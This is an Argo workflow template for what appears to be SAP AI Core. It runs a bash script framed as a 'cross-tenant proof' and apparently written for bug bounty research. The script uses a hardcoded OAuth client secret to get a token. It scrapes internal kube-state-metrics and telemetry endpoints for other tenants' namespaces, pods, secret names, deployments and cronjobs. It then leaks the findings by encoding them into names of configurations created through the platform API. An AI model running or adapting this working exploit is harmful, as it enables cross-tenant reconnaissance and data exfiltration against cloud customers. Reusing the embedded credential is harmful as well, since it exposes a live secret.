apiVersion: argoproj.io/v1alpha1
kind: WorkflowTemplate
metadata:
  name: bb14-probe
  annotations:
    scenarios.ai.sap.com/description: "BB14 test workflow"
    scenarios.ai.sap.com/name: "bb14-scenario"
    executables.ai.sap.com/description: "BB14 test executable"
    executables.ai.sap.com/name: "bb14-probe"
  labels:
    scenarios.ai.sap.com/id: "bb14-scenario"
    executables.ai.sap.com/id: "bb14-probe"
    ai.sap.com/version: "47.0.0"
spec:
  entrypoint: main
  templates:
  - name: main
    metadata:
      labels:
        ai.sap.com/resourcePlan: starter
    container:
      image: nicolaka/netshoot:latest
      command:
      - bash
      - -c
      - |
        # V47: Focused KSM namespace + pod extraction for cross-tenant proof
        AUTH_URL="https://cf-aicore-security-bb-14.authentication.eu10.hana.ondemand.com"
        API="https://api.ai.sec-eu10.eu-central-1.aws.ml.hana.ondemand.com"
        CID="sb-aicore-bb-14!b627554|aicore-xsuaa-std!b563784"
        CSC='aicore-bb-14-key$HWyz9kltTGQqtpP0ZbBl-NPwng_aMxh8F2GaXyYiPRc='

        JWT=$(curl -sk -X POST "${AUTH_URL}/oauth/token" \
          -d "grant_type=client_credentials&client_id=${CID}&client_secret=${CSC}" 2>/dev/null \
          | python3 -c "import json,sys; print(json.load(sys.stdin).get('access_token','FAIL'))" 2>/dev/null)

        save() {
          local name="v47-$(echo "$1" | tr -c 'a-zA-Z0-9._-' '-' | head -c 220)"
          curl -sk -X POST "${API}/v2/lm/configurations" \
            -H "Authorization: Bearer $JWT" -H "AI-Resource-Group: default" \
            -H "Content-Type: application/json" \
            -d "{\"name\":\"${name}\",\"executableId\":\"bb14-probe\",\"scenarioId\":\"bb14-scenario\"}" 2>/dev/null > /dev/null
        }

        KSM_PODS="100.106.241.163"
        KSM_MULTI="100.110.128.70"
        KSM_CUSTOM="100.110.192.195"

        # 1. Extract ALL unique namespaces from KSM-pods
        echo "=== NAMESPACES ===" >&2
        FULL=$(curl -sk --connect-timeout 15 "http://${KSM_PODS}:8080/metrics" 2>&1)
        NS_LIST=$(echo "$FULL" | grep -o 'namespace="[^"]*"' | sort -u | sed 's/namespace="//;s/"//')
        NS_COUNT=$(echo "$NS_LIST" | wc -l | tr -d ' ')
        save "ns-count-${NS_COUNT}"

        # Save namespaces in batches (one config per batch of ~5)
        BATCH=""
        BNUM=1
        while IFS= read -r ns; do
          if [ -n "$ns" ]; then
            BATCH="${BATCH}${ns}."
            if [ ${#BATCH} -gt 180 ]; then
              save "ns-${BNUM}-${BATCH}"
              BATCH=""
              BNUM=$((BNUM + 1))
            fi
          fi
        done <<< "$NS_LIST"
        [ -n "$BATCH" ] && save "ns-${BNUM}-${BATCH}"

        # 2. Extract rg- namespaces specifically (these are tenant resource groups)
        RGS=$(echo "$NS_LIST" | grep "^rg-")
        RG_COUNT=$(echo "$RGS" | grep -c "rg-" || true)
        save "rg-count-${RG_COUNT}"

        BATCH=""
        BNUM=1
        while IFS= read -r rg; do
          if [ -n "$rg" ]; then
            BATCH="${BATCH}${rg}."
            if [ ${#BATCH} -gt 180 ]; then
              save "rg-${BNUM}-${BATCH}"
              BATCH=""
              BNUM=$((BNUM + 1))
            fi
          fi
        done <<< "$RGS"
        [ -n "$BATCH" ] && save "rg-${BNUM}-${BATCH}"

        # 3. Pod names from OTHER namespaces (not our rg-)
        echo "=== CROSS-NS PODS ===" >&2
        OUR_NS="rg-3ba0e0a4"
        OTHER_PODS=$(echo "$FULL" | grep 'kube_pod_info\|kube_pod_status' | grep -v "${OUR_NS}" | grep -o 'pod="[^"]*"' | sort -u | head -20)
        BATCH=""
        BNUM=1
        while IFS= read -r pod; do
          if [ -n "$pod" ]; then
            BATCH="${BATCH}${pod}."
            if [ ${#BATCH} -gt 180 ]; then
              save "xpod-${BNUM}-${BATCH}"
              BATCH=""
              BNUM=$((BNUM + 1))
            fi
          fi
        done <<< "$OTHER_PODS"
        [ -n "$BATCH" ] && save "xpod-${BNUM}-${BATCH}"

        # 4. Secret metadata from KSM (kube_secret_info exposes secret names per namespace)
        echo "=== SECRETS ===" >&2
        SECRETS=$(echo "$FULL" | grep 'kube_secret' | head -20)
        if [ -n "$SECRETS" ]; then
          SEC_NS=$(echo "$SECRETS" | grep -o 'namespace="[^"]*"' | sort -u | head -5 | tr '\n' '|')
          save "sec-ns-${SEC_NS}"
          SEC_NAMES=$(echo "$SECRETS" | grep -o 'secret="[^"]*"' | sort -u | head -5 | tr '\n' '|')
          save "sec-names-${SEC_NAMES}"
        else
          save "sec-none-not-in-ksm-pods"
        fi

        # 5. KSM-multi: cronjob + deployment data across namespaces
        echo "=== KSM-MULTI ===" >&2
        MULTI=$(curl -sk --connect-timeout 15 "http://${KSM_MULTI}:8080/metrics" 2>&1)
        MULTI_SIZE=$(echo "$MULTI" | wc -c | tr -d ' ')
        save "multi-size-${MULTI_SIZE}"

        # Namespaces from multi
        MULTI_NS=$(echo "$MULTI" | grep -o 'namespace="[^"]*"' | sort -u | sed 's/namespace="//;s/"//')
        MULTI_NS_COUNT=$(echo "$MULTI_NS" | wc -l | tr -d ' ')
        save "multi-ns-count-${MULTI_NS_COUNT}"

        # Deployments from other namespaces
        DEPLOYS=$(echo "$MULTI" | grep 'kube_deployment_' | grep -v "${OUR_NS}" | grep -o 'deployment="[^"]*"' | sort -u | head -15 | tr '\n' '|')
        save "multi-deploys-${DEPLOYS}"

        # Cronjobs
        CRONS=$(echo "$MULTI" | grep 'kube_cronjob_' | grep -o 'cronjob="[^"]*"' | sort -u | head -10 | tr '\n' '|')
        save "multi-crons-${CRONS}"

        # 6. KSM-custom: CRD data
        echo "=== KSM-CUSTOM ===" >&2
        CUSTOM=$(curl -sk --connect-timeout 15 "http://${KSM_CUSTOM}:8080/metrics" 2>&1)
        CUSTOM_SIZE=$(echo "$CUSTOM" | wc -c | tr -d ' ')
        save "custom-size-${CUSTOM_SIZE}"

        # CRD types
        CRDS=$(echo "$CUSTOM" | grep '# HELP' | grep -o 'kube_customresource_[a-z_]*\|certmanager_[a-z_]*\|argo[a-z_]*' | sort -u | head -10 | tr '\n' '|')
        save "custom-crds-${CRDS}"

        # 7. Feb OTEL - try reading metrics with namespace grep
        echo "=== FEB OTEL ===" >&2
        for ip in 100.104.178.234; do
          ODATA=$(curl -sk --connect-timeout 10 "http://${ip}:8888/metrics" 2>&1)
          OSIZE=$(echo "$ODATA" | wc -c | tr -d ' ')
          save "feb-${ip}-size-${OSIZE}"
          # k8s namespace labels in otel metrics
          ONS=$(echo "$ODATA" | grep -o 'k8s.namespace.name="[^"]*"\|k8s_namespace_name="[^"]*"\|namespace="[^"]*"' | sort -u | head -10 | tr '\n' '|')
          save "feb-${ip}-ns-${ONS}"
          # Exporter types
          EXP=$(echo "$ODATA" | grep -o 'exporter="[^"]*"' | sort -u | head -5 | tr '\n' '|')
          save "feb-${ip}-exp-${EXP}"
        done

        echo "V47 DONE" >&2
